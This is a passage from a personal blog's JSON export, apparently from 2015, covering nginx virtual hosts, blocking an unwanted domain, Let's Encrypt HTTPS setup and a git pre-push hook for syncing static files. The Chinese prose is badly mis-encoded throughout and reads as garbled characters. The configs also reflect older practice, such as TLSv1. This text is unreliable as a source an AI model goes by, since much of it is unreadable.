·ï¼Œå°±å¯ä»¥å°†æ‰€æœ‰æŒ‡å‘/picsçš„è¯·æ±‚å…¨éƒ¨é‡å®šå‘åˆ°ä¸ƒç‰›çš„é“¾æ¥ã€‚é¡ºä¾¿ï¼Œåœ¨ä¸ƒç‰›è®¾ç½®äº†ä¸€ä¸‹é˜²ç›—é“¾ã€‚ 1.3 æ•ˆç‡æå‡â€”â€”Git hookå› ä¸ºæˆ‘çš„åšå®¢å’Œä¸ªäººä¸»é¡µéƒ½æ˜¯ä½¿ç”¨Coding+webhookéƒ¨ç½²çš„ï¼Œæ‰€ä»¥æ¯æ¬¡æ›´æ”¹é¡µé¢åè¦æ¨ä»£ç ï¼Œè¿˜è¦åŒæ­¥é™æ€èµ„æºã€‚æœ‰æ²¡æœ‰æ–¹æ³•å¯ä»¥æŠŠè¿™ä¸¤æ¡æ“ä½œç®€åŒ–ä¸€ä¸‹å‘¢ï¼Ÿä¸€å¼€å§‹å†™äº†ä¸ªæ‰¹å¤„ç†è„šæœ¬ï¼Œåæ¥è§‰å¾—ä¸€å®šæœ‰æ›´å¥½çš„åŠæ³•ï¼Œäºæ˜¯ç¿»äº†ç¿»ï¼Œé‡åˆ°äº†Git hookè¿™ç§ç¥å™¨ã€‚Git hookè·Ÿwebhookç±»ä¼¼ï¼Œéƒ½æ˜¯åœ¨æŸä¸ªæ“ä½œä¸ŠæŒ‚ä¸€ä¸ªâ€œé’©å­â€ï¼Œä½¿å¾—åœ¨è¿›è¡ŒæŸæ“ä½œå‘ç”Ÿæ—¶è‡ªåŠ¨è§¦å‘è‡ªå®šä¹‰è„šæœ¬æ¥è¾¾åˆ°æŸäº›ç›®çš„ï¼Œå®ç°å¿«æ·æ“ä½œã€‚æ‰€æœ‰çš„é’©å­å‡åœ¨.git/hooksç›®å½•ä¸‹ï¼Œåœ¨è¯¥ç›®å½•ä¸‹è®¾ç½®ç‰¹æ®Šæ–‡ä»¶åçš„è„šæœ¬æ–‡ä»¶æ¥è®¾ç½®é’©å­ã€‚å› ä¸ºæˆ‘éœ€è¦åœ¨æ¨é€ä»£ç ä¹‹å‰è¿›è¡Œèµ„æºåŒæ­¥ï¼Œæ‰€ä»¥æˆ‘éœ€è¦è®¾ç½®pre-pushè„šæœ¬ã€‚è„šæœ¬å†…å®¹å¦‚ä¸‹ï¼š123456#!/bin/shecho -e \"Sync up the static resources with Qiniu...\"cd /f/websites/blog/qrsync sync_conf.json 2&gt;&gt;sync.logecho -e \"Done!\"è¿™æ ·ï¼Œæˆ‘å°±å¯ä»¥åœ¨æ¯æ¬¡æ‰§è¡Œgit pushä¹‹å‰è‡ªåŠ¨åŒæ­¥é™æ€èµ„æºï¼Œå°‘æ•²ä¸€æ¡å‘½ä»¤ï¼Œæå‡å·¥ä½œæ•ˆç‡â†’_â†’ 2. è°±ç«™æ­å»ºå†…å®¹ä¸æ˜¯å¤ªå¤šï¼Œå°±å†™åœ¨è¿™é‡Œå•¦ã€‚æˆ‘æœ‰ä¸€ä¸ªä¹è°±åˆ†äº«ç«™ï¼Œé‡Œé¢å­˜æ”¾ä¸€äº›è‡ªå·±æ”¶é›†çš„é’¢ç´è°±ã€‚ä¸€å¹´ä»¥å‰å†™äº†ä¸€ä¸ªç¨‹åºï¼Œç”¨æ¥ä¸ºæ¯ä¸ªæ–‡ä»¶å¤¹ç”Ÿæˆindexé¡µé¢ã€‚å‰å‡ å¤©ç¿»å¼€é‚£ä¸ªç¨‹åºï¼Œä¸€ä¸‹å­è¢«è‡ªå·±å†™çš„è¿ç¯replaceå“åˆ°äº†ï¼ˆé‚£ä¸ªæ—¶å€™è¿æ­£åˆ™è¿˜éƒ½ä¸ä¼šï¼Œä¸è¿‡è½¬å¿µä¸€æƒ³è¦æ˜¯ä¼šäº†æ­£åˆ™ï¼Œå†™å‡ºæ¥çš„ä¸œè¥¿ä¼šå¤šå¯æ€•ğŸ˜‚ï¼‰ï¼Œäºæ˜¯æ€’ç”¨Jinjaæ¨¡æ¿æ¸²æŸ“å¼•æ“é‡å†™äº†ä¸€ä¸ªï¼ŒæŠŠåŸæ¥æœ€æ ¸å¿ƒéƒ¨åˆ†çš„åå‡ è¡Œä»£ç å˜ä¸ºäº†ä¸€è¡Œæ¸²æŸ“è¯­å¥ï¼Œä»£ç çœ‹èµ·æ¥æ¸…çˆ½å¤šäº†ã€‚å—¯ï¼Œå…·ä½“é“¾æ¥å¯ä»¥åœ¨å·¦ä¾§æˆ–é¡¶æ çš„â€œå‹æƒ…é“¾æ¥â€ä¸­æ‰¾ã€‚ 3. åè®°å†ç»ä¸€ä¸ªæœˆï¼Œåšå®¢çš„è¿ç§»å·¥ä½œåŸºæœ¬å®Œæˆï¼ˆåˆšåˆšå†™åšå®¢çš„å·¥å¤«è¿˜ç»™å®ƒæ·»åŠ äº†twemojiæ”¯æŒğŸ˜¶ï¼‰ï¼Œä»¥åè¿˜è¦åšä¸ªäººé¡µé¢ï¼Œä¸è¿‡å¯èƒ½ä¸ä¼šæœ‰å¤ªå¤šå¯å†™çš„åœ°æ–¹äº†ã€‚å°±é…±ï¼Œåé¢çœ‹ä¸€é˜µå­goä»¥åå¯ä»¥æ¥å†™å†™golangçš„ä¸œè¥¿ã€‚ 4. å‚è€ƒèµ„æ–™Nginxé‡å®šå‘è§„åˆ™è¯¦ç»†ä»‹ç»è‡ªå®šä¹‰ Git - Git é’©å­","categories":[{"name":"ä¹±ä¸ƒå…«ç³Ÿ","slug":"ä¹±ä¸ƒå…«ç³Ÿ","permalink":"https://blog.stdioa.com/categories/ä¹±ä¸ƒå…«ç³Ÿ/"}],"tags":[{"name":"nginx","slug":"nginx","permalink":"https://blog.stdioa.com/tags/nginx/"},{"name":"ä¸ƒç‰›","slug":"ä¸ƒç‰›","permalink":"https://blog.stdioa.com/tags/ä¸ƒç‰›/"},{"name":"git","slug":"git","permalink":"https://blog.stdioa.com/tags/git/"}]},{"title":"åšå®¢è¿ç§»è®°ï¼ˆäºŒï¼‰","slug":"blog-migration-ii","date":"2015-12-18T07:55:37.000Z","updated":"2018-07-12T11:35:13.409Z","comments":true,"path":"2015/12/blog-migration-ii/","link":"","permalink":"https://blog.stdioa.com/2015/12/blog-migration-ii/","excerpt":"åŸŸåä¾ç„¶åœ¨å¤‡æ¡ˆä¸­ï¼Œä¾ç„¶æƒ³å°†åšå®¢éƒ¨ç½²åˆ°æ–°ä¹°çš„VPSçš„æˆ‘å’Œè…¾è®¯æ–—æ™ºæ–—å‹‡ï¼ˆé›¾ï¼‰ï¼Œä¸ºåšå®¢æ·»åŠ äº†HTTPS&gt;_&lt;åŒæ—¶ï¼ŒæŠŠè‡ªå·±çš„å¯†ç å­¦è¯¾è®¾ä¹Ÿè½¬ç§»åˆ°VPSä¸Šæ¥äº†ã€‚","text":"åŸŸåä¾ç„¶åœ¨å¤‡æ¡ˆä¸­ï¼Œä¾ç„¶æƒ³å°†åšå®¢éƒ¨ç½²åˆ°æ–°ä¹°çš„VPSçš„æˆ‘å’Œè…¾è®¯æ–—æ™ºæ–—å‹‡ï¼ˆé›¾ï¼‰ï¼Œä¸ºåšå®¢æ·»åŠ äº†HTTPS&gt;_&lt;åŒæ—¶ï¼ŒæŠŠè‡ªå·±çš„å¯†ç å­¦è¯¾è®¾ä¹Ÿè½¬ç§»åˆ°VPSä¸Šæ¥äº†ã€‚ 1. ä½¿ç”¨Nginxé’ˆå¯¹å¤šä¸ªhostéƒ¨ç½²æœåŠ¡å™¨ 1.1 æ¦‚è¿°å¦‚æœä¸€ä¸ªVPSåªèƒ½æ­ä¸€ä¸ªç½‘ç«™ï¼Œé‚£æœªå…å¤ªæµªè´¹äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡é…ç½®Nginxçš„æ–¹å¼æ¥å°†é’ˆå¯¹å¤šä¸ªåŸŸåçš„è®¿é—®è¯·æ±‚åˆ†å¼€ï¼Œä»è€Œè¿›è¡Œä¸åŒçš„å¤„ç†ã€‚ä¾‹å¦‚ï¼Œæˆ‘åœ¨DNSé…ç½®æ—¶å°†blog.stdioa.comä¸crypt.stdioa.comåŒæ—¶æŒ‡å‘åˆ°æˆ‘çš„è…¾è®¯äº‘çš„IPåœ°å€ï¼Œç”¨æˆ·è®¿é—®è¿™ä¸¤ä¸ªåŸŸåæ—¶ï¼Œéƒ½ä¼šå‘æˆ‘çš„VPSå‘é€è¯·æ±‚ï¼Œæˆ‘è¦åšçš„æ˜¯å°†è¿™ä¸¤ç§é’ˆå¯¹ä¸åŒåŸŸåçš„è®¿é—®è¯·æ±‚åˆ†å¼€ã€‚è€Œè¿™ä¸¤ç§è¯·æ±‚çš„åŒºåˆ«åœ¨HTTPè¯·æ±‚å¤´çš„Hostå­—æ®µï¼Œæ‰€ä»¥æˆ‘åªéœ€è¦é’ˆå¯¹ä¸åŒçš„Hostä½¿ç”¨ä¸åŒçš„å¤„ç†æ–¹å¼å³å¯ã€‚ 1.2 æ“ä½œæˆ‘çš„VPSä¸Šæ’˜æœ‰ä¸¤ä¸ªç½‘ç«™ï¼Œå…¶ä¸­blog.stdioa.comåŸŸåæŒ‡å‘çš„æ˜¯æˆ‘çš„åšå®¢â€”â€”ä¸€ä¸ªé™æ€æœåŠ¡å™¨ï¼Œè€ŒcryptåŸŸåæŒ‡å‘çš„æ˜¯ä¸€ä¸ªä½¿ç”¨flaskæ­å»ºçš„ç½‘ç«™ï¼Œæ‰€ä»¥è¦åœ¨Nginxç«¯è¿›è¡Œåå‘ä»£ç†ï¼Œå°†è¯·æ±‚è½¬å‘åˆ°æœ¬åœ°çš„5000ç«¯å£ã€‚å…·ä½“é…ç½®æ–‡ä»¶å¦‚ä¸‹ï¼š12345678910111213141516171819202122232425262728server &#123; listen 80; server_name stdioa.com blog.stdioa.com; # é€šå¾€åšå®¢çš„è¯·æ±‚ç›´æ¥é€šè¿‡æ–‡ä»¶æœåŠ¡å™¨è¿”å› access_log /var/log/nginx/access_blog.log; error_log /var/log/nginx/error_blog.log; root /home/stdio/blog; index index index.html; location / &#123; &#125; location ^~ /.git &#123; # ç¦æ­¢è®¿é—®.gitæ–‡ä»¶å¤¹ deny all; &#125; error_page 404 /404.html;&#125;server &#123; listen 80; server_name crypt.stdioa.com; # hostä¸ºcryptçš„è¯·æ±‚è½¬å‘æœ¬åœ°ç«¯å£ access_log /var/log/nginx/access_crypt.log; error_log /var/log/nginx/error_crypt.log; location / &#123; proxy_pass http://127.0.0.1:5000/; &#125;&#125;é…ç½®å®Œæˆåï¼Œé‡å¯Nginx, å¯ä»¥çœ‹åˆ°è®¿é—®ä¸åŒåŸŸåæ—¶ï¼Œè¯·æ±‚ä¼šäº¤ç»™ä¸åŒçš„ç¨‹åºå¤„ç†ã€‚ 2. å±è”½æ¥è‡ªç‰¹å®šåŸŸåçš„è¯·æ±‚ 2.1 èƒŒæ™¯ç½‘ç«™éƒ¨ç½²å¥½åï¼Œåˆå‘ç°äº†ä¸€ä¸ªæ¥è‡ªå¥‡æ€ªåŸŸåçš„è¯·æ±‚ï¼›æ›´å‘çˆ¹çš„æ˜¯ï¼Œè¿™ä¸ªåŸŸåæŒ‡å‘è‡ªå·±çš„VPSï¼›æ›´æ›´å‘çˆ¹çš„æ˜¯ï¼Œæ¥è‡ªè¿™ä¸ªåŸŸåçš„è¯·æ±‚æœ‰å¥½å¤šï¼Œç›´æ¥æŠŠæˆ‘çš„æ—¥å¿—åˆ·çˆ†äº†â€¦æ‰€ä»¥æˆ‘éœ€è¦å°†æ¥è‡ªè¿™ä¸ªåŸŸåçš„æ‰€æœ‰è¯·æ±‚æ‹’ç»æ‰ã€‚ 2.2 æ“ä½œæ–°å»ºä¸€ä¸ªServerå°±å¥½å•¦ã€‚å…·ä½“é…ç½®æ–‡ä»¶å¦‚ä¸‹ï¼š1234567server &#123; listen 80; server_name bailigo.com *.bailigo.com; location / &#123; return 410; # 410 Gone, ä½¿ç”¨äº†è¿™ä¸ªçŠ¶æ€ç ï¼Œä¸çŸ¥é“èƒ½ä¸èƒ½ä¸å†è®©çˆ¬è™«çˆ¬è¿™ä¸ªç½‘é¡µ &#125;&#125;é…ç½®å®Œæˆï¼Œé‡æ–°è½½å…¥é…ç½®æ–‡ä»¶ï¼ŒæˆåŠŸã€‚æœ¬æ¥æƒ³ç”¨418, ä½†æ˜¯Nginxæ²¡æœ‰418çš„è¿”å›é¡µé¢ï¼Œæƒ³äº†æƒ³è¿˜æ˜¯ç®—äº†å§ 3. ä¸ºåšå®¢éƒ¨ç½²HTTPSæœåŠ¡å™¨ 3.1 èƒŒæ™¯blog.stdioa.comåšå®¢ä¸Šåˆè¿˜å¯ä»¥è®¿é—®ï¼Œä¸­åˆåƒé¡¿é¥­å°±å‘ç°è®¿é—®è¢«æˆªæ–­äº†ï¼ŒåŸå› ä¸ä»¥å‰ä¸€æ ·â€”â€”åŸŸåæœªå®Œæˆå¤‡æ¡ˆã€‚ç»æŸ¥çœ‹ï¼Œè…¾è®¯å¯¹è®¿é—®åšå®¢çš„è¯·æ±‚è¿›è¡Œäº†301è·³è½¬ï¼Œäºæ˜¯æƒ³äº†æƒ³ï¼Œç»™åšå®¢é…ç½®äº†HTTPS, è®©ä½ ä»¬å†é˜»æ–­â†’_â†’ï¼ˆå¥½å§å†é˜»æ–­çš„è¯æˆ‘çœŸçš„ä¸çŸ¥é“è¯¥æ€ä¹ˆå¼„äº† 3.2 ä½¿ç”¨Letâ€™s Encryptç”Ÿæˆç½‘ç«™è¯ä¹¦ä¹‹å‰å°±çœ‹ä¸­äº†Letâ€™s Encryptï¼Œå®ƒæä¾›ä¸»æµæµè§ˆå™¨è®¤è¯çš„å…è´¹è¯ä¹¦ï¼Œåªå¯æƒœå½“æ—¶æ²¡æœ‰åŸŸåæ— æ³•ä½“éªŒã€‚ç°åœ¨æœ‰äº†åŸŸåï¼ŒåŠ ä¸Šè…¾è®¯å¯¹æœªå¤‡æ¡ˆçš„åŸŸåæŸ¥çš„å¾ˆç´§ï¼Œæ‰€æœ‰æœªå¤‡æ¡ˆåŸŸåä¸‹çš„ç½‘ç«™æ­èµ·æ¥åŠå¤©å°±è¢«å°æ‰ï¼Œæƒ³äº†æƒ³ï¼Œè¿˜æ˜¯ç”Ÿæˆä¸€ä¸ªè¯ä¹¦ï¼Œé…ä¸ªHTTPSæ’‘ä¸€é˜µå­å§â•®(â•¯_â•°)â•­æŒ‰ç…§å®˜æ–¹çš„æŒ‡å—ä»¥åŠæ­¤æŒ‡å—åœ¨å°†Letâ€™s Encryptçš„Repo cloneåˆ°æœ¬åœ°ä¹‹åï¼Œè¾“å…¥./letsencrypt-auto certonly --email é‚®ç®± -d åŸŸå --agree-tosæ¥ç”Ÿæˆè¯ä¹¦ã€‚ç”±äºè…¾è®¯äº‘åˆ°Letâ€™s Encryptçš„æœåŠ¡å™¨çš„é“¾æ¥æå…¶ä¸ç¨³å®šï¼Œé€šå¸¸éœ€è¦é‡è¯•å¾ˆå¤šæ¬¡æ‰èƒ½æ­£å¸¸è·ŸLetâ€™s Encryptçš„æœåŠ¡å™¨é€šä¿¡ã€‚æˆåŠŸåä¼šæ˜¾ç¤ºï¼šIMPORTANT NOTES:- Congratulations! Your certificate and chain have been saved at/etc/letsencrypt/live/blog.stdioa.com/fullchain.pem. Your certwill expire on 2016-03-17. To obtain a new version of thecertificate in the future, simply run Letâ€™s Encrypt again.- If you like Letâ€™s Encrypt, please consider supporting our work by:Donating to ISRG / Letâ€™s Encrypt: https://letsencrypt.org/donateDonating to EFF: https://eff.org/donate-leè¯ä¹¦å·²å­˜å‚¨åœ¨ä¸Šé¢ä¿¡æ¯æŒ‡ç¤ºçš„ç›®å½•ã€‚ 3.3 é…ç½®Nginx, æ­å»ºHTTPSæœåŠ¡å™¨è¯ä¹¦å·²ç”Ÿæˆï¼Œä¸‹é¢è¯¥é…ç½®Nginxäº†ï¼Œæ·»åŠ ä¸‹åˆ—é…ç½®ï¼š123456789101112131415161718192021222324server &#123; listen 443 ssl; server_name blog.stdioa.com; ssl_certificate /etc/letsencrypt/live/blog.stdioa.com/fullchain.pem; # æ·»åŠ è¯ä¹¦ ssl_certificate_key /etc/letsencrypt/live/blog.stdioa.com/privkey.pem; # æ·»åŠ å¯†é’¥ ssl_ciphers \"EECDH+AESGCM:EDH+AESGCM:AES256+EECDH:AES256+EDH\"; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_prefer_server_ciphers on; ssl_session_cache shared:SSL:10m; # åé¢å’Œæ™®é€šæœåŠ¡å™¨ä¸€æ · access_log /var/log/nginx/access_blog.log; error_log /var/log/nginx/error_blog.log; root /home/stdio/blog; index index index.html; location ^~ /.git &#123; deny all; &#125; error_page 404 /404.html;&#125;é‡æ–°åŠ è½½é…ç½®ï¼Œè®¿é—®https://blog.stdioa.com , æˆåŠŸ~å°æ’æ›²ï¼šæ˜¨å¤©æ™šä¸Šç†„ç¯ä¹‹å‰å‘ç°Ubuntuä¸Šä½¿ç”¨apt-getå®‰è£…çš„Nginxç‰ˆæœ¬å¤ªè€äº†ï¼Œäºæ˜¯åœ¨VPSä¸Šé‡æ–°ç¼–è¯‘å‡çº§äº†Nginxï¼Œç»“æœé…ç½®å¥½HTTPSä»¥åé‡å¯Nginxæ—¶å‘ç°å¯åŠ¨å¤±è´¥ï¼ŒåŸå› ä¸ºç¼ºå°‘ngxç»„ä»¶ã€‚ç»Googleåå‘ç°æ²¡æœ‰ç¼–è¯‘è¯¥ç»„ä»¶ï¼Œæ‰€ä»¥é‡æ–°ç¼–è¯‘å®‰è£…Nginx, åœ¨é…ç½®æ—¶åŠ å…¥--with-http_ssl_moduleé€‰é¡¹ã€‚å°æ’æ›²2ï¼šHTTPSé…ç½®å¥½åè®¿é—®åšå®¢ï¼ŒChromeæç¤ºâ€œå­˜åœ¨ä¸å®‰å…¨çš„å†…å®¹â€ï¼Œé€‰æ‹©åŠ è½½åï¼Œåœ°å€æ å·¦è¾¹çš„HTTPSä¼šå˜æˆçº¢è‰²ï¼Œæå…¶ä¸å¥½çœ‹ï¼ˆé›¾ï¼‰ï¼Œäºæ˜¯çœ‹äº†åšå®¢çš„æ¨¡æ¿ï¼Œå‘ç°æœ‰ä¸¤ä¸ªjsåœ¨åŠ è½½æ—¶é€‰æ‹©ä½¿ç”¨HTTPæ–¹å¼åŠ è½½ï¼Œäºæ˜¯å°†http://.../*.jsæ”¹ä¸º//.../*.js, ä½¿æµè§ˆå™¨å¯ä»¥æ ¹æ®å½“å‰åè®®è‡ªåŠ¨é€‰æ‹©JSæ–‡ä»¶çš„åŠ è½½åè®®ã€‚æ›´æ–°åšå®¢æ¨¡æ¿ï¼Œé‡æ–°è®¿é—®ï¼Œæ‰€æœ‰jså‡ä½¿ç”¨HTTPSæ–¹å¼åŠ è½½ï¼Œé—®é¢˜è§£å†³ã€‚é™„å›¾:![å“ˆå“ˆå“ˆHTTPS](/pics/hhh_HTTPS.jpg)å°æ’æ›²3ï¼šä¸Šé¢é‚£å¼ å›¾ç‰‡çš„é“¾æ¥ä¹‹å‰æ¥è‡ªä¸ƒç‰›ï¼Œé‡‡ç”¨HTTPåè®®è€Œä¸æ˜¯HTTPSåŠ è½½ã€‚å‘å¸ƒè¿™ç¯‡åšæ–‡åï¼Œæˆ‘å‘ç°è¯¥æ–‡ç« é¡µé¢ä¸­åœ°å€æ å·¦ä¾§çš„HTTPSæ ‡å¿—å˜ä¸ºäº†ç™½è‰²â€¦è¿˜æ˜¯ä¸å¥½çœ‹ï¼æ‰“å¼€Chromeçš„æ§åˆ¶å°ï¼Œåœ¨æ§åˆ¶å°ä¸­çœ‹åˆ°ï¼Œå¦‚æœå›¾ç‰‡é“¾æ¥åè®®ä¸ºHTTPSï¼Œåˆ™Chromeä¾ç„¶ä¼šæç¤ºâ€œä¸å®‰å…¨â€ï¼Œä½†æ˜¯ä¸ªäººæ„Ÿè§‰è¿™åªæ˜¯ä¸€å¼ å›¾ç‰‡è€Œå·²å•Šï¼Œåˆä¸æ˜¯JS_(:Ğ·ã‚âˆ )_è§£å†³æ–¹æ¡ˆï¼šå°†å›¾ç‰‡é“¾æ¥æ”¹å›æœ¬åœ°ï¼Œå¾…åŸŸåå¤‡æ¡ˆåå†æƒ³åŠæ³•åœ¨ä¸ƒç‰›é‚£è¾¹è§£å†³åŸŸåç»‘å®šåŠHTTPSçš„é—®é¢˜ã€‚ 4. å‚è€ƒèµ„æ–™å…è´¹SSLå®‰å…¨è¯ä¹¦Letâ€™s Encryptå®‰è£…ä½¿ç”¨æ•™ç¨‹(é™„Nginx/Apacheé…ç½®)http://blog.csdn.net/donghustone/article/details/25797727nginx SSL error - Server Faultç½‘ç«™å­˜åœ¨ä¸å®‰å…¨å› ç´ çš„è§£å†³åŠæ³• 5. åè®°å¿«é€’å·²å‘å‡ºï¼Œç›¸ç‰‡å·²å®¡æ ¸æˆåŠŸï¼Œè…¾è®¯æ”¶åˆ°èµ„æ–™ä¹‹åä¼šå°½å¿«æŠ¥ç®¡å±€å®¡ç†â€¦å¸Œæœ›2016å¹´ä¹‹å‰èƒ½å¤Ÿå¤‡æ¡ˆæˆåŠŸQvQå—¯ï¼ŒGoogleçœŸå¥½ç”¨è¯´å¥½çš„å‡†å¤‡è€ƒè¯•å‘¢ï¼Update @ 16:38ä¸Šåˆæ‰æŠŠèµ„æ–™ç”¨å¿«é€’å‘èµ°ï¼Œä¸‹åˆè…¾è®¯äº‘å°±è¯´æˆ‘çš„çº¸è´¨èµ„æ–™å·²æ”¶åˆ°â€¦æ‰“ç”µè¯é—®äº†ä¸€ä¸‹ï¼Œå®¢æœè¯´è…¾è®¯ä¸ºäº†åŠ å¿«å®¡æ ¸é€Ÿåº¦ï¼Œå¸®æˆ‘å‡†å¤‡äº†ä¸€ä»½ææ–™ä¸Šäº¤ç®¡å±€ï¼Œä¼°è®¡ä»–ä»¬æ˜¯ç”¨æˆ‘çš„æ‰«æä»¶æ‰“å°äº†ä¸€ä»½äº¤ä¸Šå»äº†å§ï¼Œä¹Ÿæ˜¯ä¸é”™2333 æœ€åå¸Œæœ›é€šä¿¡äº¤é€šç®¡ç†å±€å¿«ä¸€ç‚¹_(:Ğ·ã‚âˆ )_Update @ 19:59, Dec. 24th, 2015è…¾è®¯äº‘è®¿é—®Githubçš„é€Ÿåº¦å¤ªæ…¢äº†ï¼Œäºæ˜¯å°†åšå®¢çš„Repoè¿ç§»åˆ°äº†Codingä¸Šã€‚å»ºç«‹ç§æœ‰é¡¹ç›®è®¾ç½®éƒ¨ç½²å…¬é’¥å› ä¸ºæ˜¯ç§æœ‰é¡¹ç›®æ‰€ä»¥æ— æ³•é€šè¿‡ä¸€ä¸ª__ä¸å«ç”¨æˆ·åå¯†ç __çš„é“¾æ¥è®¿é—®Repoæ¥è¿›è¡ŒPullï¼Œæ‰€ä»¥è¿˜æ˜¯é€šè¿‡SSHè®¿é—®æ¯”è¾ƒèˆ’æœä¸€äº›ã€‚æ”¹æ‰VPSä¸Šçš„originé“¾æ¥ï¼Œå®Œæˆæ›¾ç»å¬åˆ°è¿‡ä¸€ç§è¯´æ³•ï¼šç”¨HTTPSè®¿é—®Git Repoè¦æ¯”SSHæ›´å¥½ï¼Œç„¶è€Œä¸€ç›´ä¸çŸ¥é“å¥½åœ¨å“ªâ€¦è®°å¾—ç”¨HTTPSè®¿é—®Repoçš„æ—¶å€™è´¦æˆ·çš„ç”¨æˆ·åå’Œå¯†ç æ˜¯è¦é™„åœ¨é“¾æ¥é‡Œé¢çš„ï¼Œæ„Ÿè§‰å¥½ä¸å®‰å…¨åŸŸåå¤‡æ¡ˆçœ‹æ¥çœŸçš„è¦å¥”ç€20å¤©çš„æ ·å­å»äº†â€¦Update @ 11:07, Jan. 5th, 2015åŸŸåå¤‡æ¡ˆåœ¨2016å¹´çš„ç¬¬ä¸€ä¸ªå·¥ä½œæ—¥é€šè¿‡å•¦ï¼åº†ç¥ä¸€ä¸‹ï¼ŒæœŸæœ«ä¹‹åå¼€å§‹å‡†å¤‡åˆ¶ä½œä¸ªäººç½‘ç«™~","categories":[{"name":"ä¹±ä¸ƒå…«ç³Ÿ","slug":"ä¹±ä¸ƒå…«ç³Ÿ","permalink":"https://blog.stdioa.com/categories/ä¹±ä¸ƒå…«ç³Ÿ/"}],"tags":[{"name":"nginx","slug":"nginx","permalink":"https://blog.stdioa.com/tags/nginx/"},{"name":"Github","slug":"Github","permalink":"https://blog.stdioa.com/tags/Github/"},{"name":"Let's Encrypt","slug":"Let-s-Encrypt","permalink":"https://blog.stdioa.com/tags/Let-s-Encrypt/"}]},{"title":"åšå®¢è¿ç§»è®°ï¼ˆä¸€ï¼‰","slug":"blog-migration","date":"2015-12-17T11:55:37.000Z","updated":"2018-07-12T00:15:11.629Z","comments":true,"path":"2015/12/blog-migration/","link":"","permalink":"https://blog.stdioa.com/2015/12/blog-migration/","excerpt":"æ˜¨å¤©ä¹°äº†ä¸€ä¸ªVPSã€ä¸€ä¸ªåŸŸåï¼Œå†³å®šæŠŠåšå®¢è¿ç§»åˆ°VPSä¸Šã€‚","text":"æ˜¨å¤©ä¹°äº†ä¸€ä¸ªVPSã€ä¸€ä¸ªåŸŸåï¼Œå†³å®šæŠŠåšå®¢è¿ç§»åˆ°VPSä¸Šã€‚ 1. èƒŒæ™¯ä»‹ç»é¦–å…ˆæ‰“ä¸ªå¹¿å‘Šï¼šå€ŸåŠ©â€œè…¾è®¯äº‘+æ ¡å›­â€è®¡åˆ’ï¼Œæˆ‘æˆåŠŸåœ°ç”¨ä¸Šäº†1å…ƒ/æœˆçš„æœåŠ¡å™¨å’Œ11å…ƒ/æœˆçš„.comåŸŸåã€‚æœ‰äº†å›½å†…è®¿é—®é€Ÿåº¦æå¿«çš„VPSï¼Œæœ‰äº†åŸŸåï¼Œå°±æƒ³è‡ªå·±é¼“æ£é¼“æ£ï¼ŒæŠŠè‡ªå·±çš„åšå®¢å’Œå…¶ä»–ç«™ç‚¹æ‰˜ç®¡åˆ°VPSä¸Šã€‚ 2. åšå®¢æ‰˜ç®¡ 2.1 æ­å»ºé™æ€æ–‡ä»¶æœåŠ¡å™¨å› ä¸ºè‡ªå·±çš„åšå®¢æ˜¯é™æ€åšå®¢ï¼Œä¹‹å‰æ‰˜ç®¡åœ¨Githubä¸Šï¼Œä¾é Github Pageså®ç°éƒ¨ç½²ï¼Œæ‰€ä»¥æˆ‘å…ˆå°†æ–‡ä»¶cloneäº†ä¸‹æ¥ï¼Œå­˜æ”¾åœ¨~/blogç›®å½•ä¸­ã€‚ä¸‹é¢è¦åšçš„ï¼Œæ˜¯æ­å»ºä¸€ä¸ªé™æ€æœåŠ¡å™¨ã€‚ 2.1.1 ä½¿ç”¨Pythonçš„SimpleHTTPServerPythonçš„SimpleHTTPServeræ˜¯ä¸€ä¸ªéå¸¸å®ç”¨ã€æ–¹ä¾¿çš„åº“ï¼Œå¯ä»¥ä½¿ç”¨ç®€å•ä¸€æ¡å‘½ä»¤åœ¨å½“å‰ç›®å½•åˆ›å»ºä¸€ä¸ªHTTPæ–‡ä»¶æœåŠ¡å™¨ã€‚æ‰€ä»¥è¾“å…¥sudo python -m SimpleHTTPServer 80å‘½ä»¤ï¼Œå³å¯æ­å»ºä¸€ä¸ªé™æ€æ–‡ä»¶æœåŠ¡å™¨ï¼Œå®ç°ä»å¤–ç½‘å¯¹é™æ€åšå®¢çš„ç›´æ¥è®¿é—®ã€‚ç„¶è€Œæ­å»ºå¥½åï¼Œæˆ‘å‘ç°äº†ä¸€ä¸ªé—®é¢˜ï¼šå› ä¸ºæˆ‘çš„blogæ–‡ä»¶å¤¹æœ¬èº«æ˜¯ä¸€ä¸ªGit Repo, æ‰€ä»¥æˆ‘å¯ä»¥ç›´æ¥ä»å¤–ç½‘è®¿é—®.gitæ–‡ä»¶å¤¹ï¼Œè™½ç„¶æˆ‘çš„.gitç›®å½•æ²¡æœ‰ä¿å­˜ä»»ä½•è®¾ç½®åŠè´¦æˆ·ç­‰ï¼Œä½†è¿™æ ·ä¼šå¸¦æ¥ä¸€å®šçš„å®‰å…¨éšæ‚£ï¼Œæ‰€ä»¥è¦æƒ³åŠæ³•ç¦æ­¢å¤–éƒ¨ç”¨æˆ·å¯¹.gitæ–‡ä»¶å¤¹çš„è®¿é—®ã€‚ 2.1.2 ä½¿ç”¨Nginxæ‰˜ç®¡æ–‡ä»¶æœåŠ¡å™¨å…³äºNginxçš„ä»‹ç»ï¼Œè¯·è‡ªè¡Œè®¿é—®å®˜ç½‘ä¸ç»´åŸºç™¾ç§‘ã€‚ä¹‹å‰ç”¨è¿‡Apache, ä½†æ˜¯åœ¨æ¥è§¦Nginxåï¼Œæˆ‘è®¤ä¸ºæˆ‘å¯¹Nginxæ›´æœ‰å¥½æ„Ÿï¼Œæ‰€ä»¥é‡‡ç”¨äº†Nginxåšä¸ºæ–‡ä»¶æ‰˜ç®¡æœåŠ¡å™¨ã€‚é¦–å…ˆå®‰è£…Nginxï¼Œåˆ æ‰/etc/nginx/sites-enabledç›®å½•ï¼ˆæˆ‘çš„ç³»ç»Ÿæ˜¯Ubuntu Server 14.04 LTSï¼‰ï¼Œåœ¨conf.dç›®å½•ä¸­è®¾ç½®é…ç½®æ–‡ä»¶ï¼š12345678910111213server &#123; listen 80; # ç›‘å¬ç«¯å£ server_name server; root /home/ubuntu/blog; # æ‰˜ç®¡ç›®å½• index index.html; access_log /var/log/nginx/access_blog.log error_log /var/log/nginx/error_blog.log # ç¦æ­¢å¯¹.gitç›®å½•çš„è®¿é—® location ^~ /.git &#123; deny all; &#125;&#125;é…ç½®å®Œæˆåï¼Œé‡å¯Nginx, 